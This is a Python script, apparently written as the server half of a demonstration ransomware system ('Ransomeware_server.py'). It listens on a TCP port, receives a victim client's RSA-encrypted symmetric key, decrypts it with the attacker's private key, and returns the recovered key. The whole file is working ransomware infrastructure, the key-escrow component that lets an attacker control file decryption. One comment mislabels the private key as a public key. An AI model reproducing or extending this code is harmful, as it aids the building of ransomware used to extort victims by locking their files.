#!/usr/bin/env python3

import socketserver
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

# Author : Bobby Valenzuela
# Created : 14th January 2023

"""
This script will accept the EncryptedSymmetricKey (ESK) from the client script and decrypt the ESK using the server machines (this machine) private key.
Next, we will send the original symmetric key (SK) that we decrypted back to this client script.


Usage: python3 Ransomeware_server.py
"""


class ClientHandler(socketserver.BaseRequestHandler):

    def handle(self):
        clientEncryptedSymmetricKey = self.request.recv(1024).strip()
        
        HOST_PRIV_KEY_PATH = 'server_keys/private_key.pem' # <=== Hackers public key
        
        # Load our host private key
        with open(HOST_PRIV_KEY_PATH,"rb") as key_file:
            hostPrivate_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )

        # Decrypt client encrypted private key using hostPrivate_key and write to file
        client_private_key = hostPrivate_key.decrypt(
            clientEncryptedSymmetricKey,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        print(f"Received Client Private Key (Decrypted) {client_private_key}")

        self.request.sendall(client_private_key)


if __name__ == "__main__" :

    HOST, PORT = "localhost", 5000

    tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)

    try:
        print("Listening...")
        tcpServer.serve_forever()
    except:
        print("There was an error")

